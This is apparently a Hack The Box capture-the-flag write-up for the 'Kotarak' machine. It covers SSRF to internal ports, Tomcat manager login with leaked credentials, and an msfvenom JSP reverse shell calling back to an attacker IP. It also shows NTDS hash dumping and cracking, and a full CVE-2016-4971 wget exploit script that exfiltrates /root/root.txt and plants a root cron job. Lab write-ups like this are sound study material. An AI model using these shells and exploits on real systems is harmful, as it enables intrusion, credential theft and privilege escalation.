# Kotarak
#### 10.10.10.55
###### Dotaplayer365


Nmap
```
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (EdDSA)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 2 webservers

* **http://kotarak.htb:8080/**
  
  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/8080.PNG"></kbd>
  
  We do some dirbusting and we see the /examples directory, whchich comes default with the installation
  
  Nothing unusual anywhere else.
  
  We also have a login at /manager/html but we dont have any creds yet


* **http://kotarak.htb:60000/**

  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/60000.PNG"></kbd>
  
  Looks like a browser inside a browser (Inception :D )
  
  We try to query the local 8080 page we found and it returns the same thing like before
  
  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/localhost.8080.PNG"></kbd>
  
  <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/localhost.8080.result.PNG"></kbd>
  
  It looks like it some kind of proxy, maybe there are other ports internally which are open
  
  After some dirbusting we find this
  ```http://10.10.10.55:60000/url.php?path=127.0.0.1:60000/server-status```
  
  The server status page shows that there are many ports open which has different stuff on it
  
  One of the ports has some juicy info 
  ```http://10.10.10.55:60000/url.php?path=localhost:888/?doc=backup```
  
<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/888.PNG"></kbd>


| Username            | Password            |
| ------------- |:-------------------------:|
| admin    | 3@g01PdhB!     |


Lets try that Username and Password at the 8080 login page

We are in!!

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/8080login.PNG"></kbd>

Lets create a msfvenom reverse shell payload 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.112 LPORT=4443 -f war > dotalol.war
```

Start a listner with msfvenom

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload/java/jsp_shell_reverse_tcp 
msf exploit(handler) > set LHOST 10.10.15.112
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.112     yes       The listen address
   LPORT  4443             yes       The listen port
   SHELL                   no        The system shell to use.
```

Upload the .war to the 

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Kotarak/Images/uploadwar.PNG"></kbd>

After we deplot it, we start the listner and visit ```http://kotarak.htb:8080/dotalol/```

```
[*] Command shell session 1 opened (10.10.15.112:4443 -> 10.10.10.55:56176) at 2017-12-24 03:26:20 +0530

msf exploit(handler) > sessions -i

Active sessions
===============

  Id  Name  Type              Information  Connection
  --  ----  ----              -----------  ----------
  1         shell java/linux               10.10.15.112:4443 -> 10.10.10.55:56176 (10.10.10.55)
```

Lets upgrade it to a meterpreter shell for better use

```
msf exploit(handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.15.112:4433 
[*] Sending stage (847604 bytes) to 10.10.10.55
[*] Meterpreter session 2 opened (10.10.15.112:4433 -> 10.10.10.55:33194) at 2017-12-24 03:26:39 +0530
[*] Command stager progress: 100.00% (736/736 bytes)
msf exploit(handler) > sessions -i

Active sessions
===============

  Id  Name  Type                   Information                                             Connection
  --  ----  ----                   -----------                                             ----------
  1         shell java/linux                                                               10.10.15.112:4443 -> 10.10.10.55:56176 (10.10.10.55)
  2         meterpreter x86/linux  uid=1001, gid=1001, euid=1001, egid=1001 @ 10.10.10.55  10.10.15.112:4433 -> 10.10.10.55:33194 (10.10.10.55)

```

After some enumerating we find something

```
meterpreter > pwd
/home/tomcat/to_archive/pentest_data
meterpreter > ls
Listing: /home/tomcat/to_archive/pentest_data
=============================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100644/rw-r--r--  16793600  fil   2017-07-21 21:46:23 +0530  20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
100644/rw-r--r--  12189696  fil   2017-07-21 21:46:45 +0530  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

Lets download both the files into our machine and rename them to something simpler like kotarak.dit and kotarak.bin

There is a nice writeup on how we can extract data from .dit files [here](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)


Lets use the all great Impacket !!

Install all the dependencies and it should work. If any errors or the output isnt right, there is also a manual way of doing it on the link above which works perfectly fine.

After running secretsdump.py we get something like this
```
root@kali:~/hackthebox/Machines/Kotarak/writeup/impacket/examples# python secretsdump.py -ntds ../../kotarak.dit -system ../../kotarak.bin LOCAL
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from ../../kotarak.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
..
..
..
```

Lets hascat that
```
.\hashcat64.exe -m 1000 .\hash.txt --username .\rockyou.txt
e64fe0f24ba2489c05e64354d74ebd11:f16tomcat!
```

Seems legit F16 

Lets get a shell on meterpreter and try to su as the user

We check `/etc/passwd` and we find that the username is atanas

```
meterpreter > shell

python -c 'import pty; pty.spawn("/bin/sh")'
$ su atanas
su atanas
Password: f16tomcat!

atanas@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ whoami
whoami
atanas

```

***user.txt***
```
atanas@kotarak-dmz:~$ cat user.txt
cat user.txt
93f844f50491ef797c9c1b601b4bece8
```

The root folder has 2 files and they are actually readable, checking them out

```
atanas@kotarak-dmz:/root$ls -l
ls -l
total 8
-rw------- 1 atanas root 333 Jul 20 22:53 app.log
-rw------- 1 atanas root  66 Aug 29 11:36 flag.txt
atanas@kotarak-dmz:/root$ cat flag.txt
cat flag.txt
Getting closer! But what you are looking for can't be found here.
atanas@kotarak-dmz:/root$ cat app.log
cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```

It looks like there is something else on the network at ```10.0.3.133```

Checking ifconfig shows that we are connected to another network and our local ip for that network is ```10.0.3.1```

We also see the wget version and its old af
```
root@kali:~/hackthebox/Machines/Kotarak# searchsploit wget 1.1
```

| Exploit Title                                                   |  Path                       |
|:-------------------------:                                      |:-------------------------:  |
|GNU Wget < 1.18 - Access List Bypass / Race Condition            | multiple/remote/40824.py    |
|GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution  | linux/remote/40064.txt      |
|wget 1.10.2 - (Unchecked Boundary Condition) Denial of Service   | multiple/dos/2947.pl        |

The one which we can use is the 40064.txt

The exploit is made for remote machines, but with two terminals we can exec it on local machine as well, our exploit should work!

So, according to the exploit we need to create 2 files , one is ```.wgetrc``` and another is a python executable ```exploit.py```

We can create the python exec on our machine and upload it via meterpreter, the things we need to change inside the exploit is the HTTP_LISTEN_IP and the FTP_IP to ```10.0.3.1```

This is what it should look like

```python
#!/usr/bin/env python
 
#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971 
#
 
import SimpleHTTPServer
import SocketServer
import socket;
 
class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc
 
       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
      print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return
 
       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()
 
   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob
 
       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
      print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return
 
       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)
 
       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)
 
       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"
 
       return
 
HTTP_LISTEN_IP = '10.0.3.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.0.3.1'
FTP_PORT = 21
 
ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"
 
handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)
 
print "Ready? Is your FTP server running?"
 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)
 
print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT
 
handler.serve_forever()
```

Upload it to the server (If the tmp dir was created by the user then you might have to change perms toupload stuff to it)

```
meterpreter > pwd
/tmp/dotalol
meterpreter > upload exploit.py
[*] uploading  : exploit.py -> exploit.py
[*] uploaded   : exploit.py -> exploit.py
```

Now we create a .wgetrc

```
cat <<_EOF_>.wgetrc
post_file = /root/root.txt
output_document = /tmp/dotalol/wget-exploit.txt
_EOF_

ls -la
total 16
drwxr-x---  2 tomcat tomcat 4096 Dec 23 18:05 .
drwxrwxrwt 13 root   root   4096 Dec 23 18:01 ..
-rw-r-----  1 tomcat tomcat   75 Dec 23 18:05 .wgetrc
-rw-r-----  1 tomcat tomcat 2908 Dec 23 18:01 exploit.py
```

The POC then asks us to run ```python -m pyftpdlib -p21 -w```

However when we try to run it, it gives us socket error Permission denied

After reading up on [this](https://stackoverflow.com/a/24001186) we try to find what would allow us to use ports below 1024, and what is find is gold! [authbind](https://packages.debian.org/stable/authbind)

When we try and run ```authbind python -m pyftpdlib -p21 -w``` it says permission denied, maybe we need to be atanas for this

```
atanas@kotarak-dmz:/tmp/dotalol$ authbind python -m pyftpdlib -p21 -w
authbind python -m pyftpdlib -p21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2017-12-23 18:17:13] >>> starting FTP server on 0.0.0.0:21, pid=18589 <<<
[I 2017-12-23 18:17:13] concurrency model: async
[I 2017-12-23 18:17:13] masquerade (NAT) address: None
[I 2017-12-23 18:17:13] passive ports: None
[I 2017-12-23 18:17:14] 10.0.3.1:36418-[] FTP session opened (connect)
```

Now we Ctrl+Z out and spawn a new shell with which we can run the exploit.py
```
atanas@kotarak-dmz:/tmp/dotalol$ authbind python exploit.py
authbind python exploit.py
Ready? Is your FTP server running?
FTP found open on 10.0.3.1:21. Let's go then

Serving wget exploit on port 80...


10.0.3.133 - - [23/Dec/2017 18:24:01] code 404, message File not found
10.0.3.133 - - [23/Dec/2017 18:24:01] "HEAD /archive.tar.gz HTTP/1.1" 404 -

..
..
..
```

Waiting for root
<kbd><img src="https://media.giphy.com/media/3ohs7Xldjh7DndQnBu/giphy.gif"></kbd>

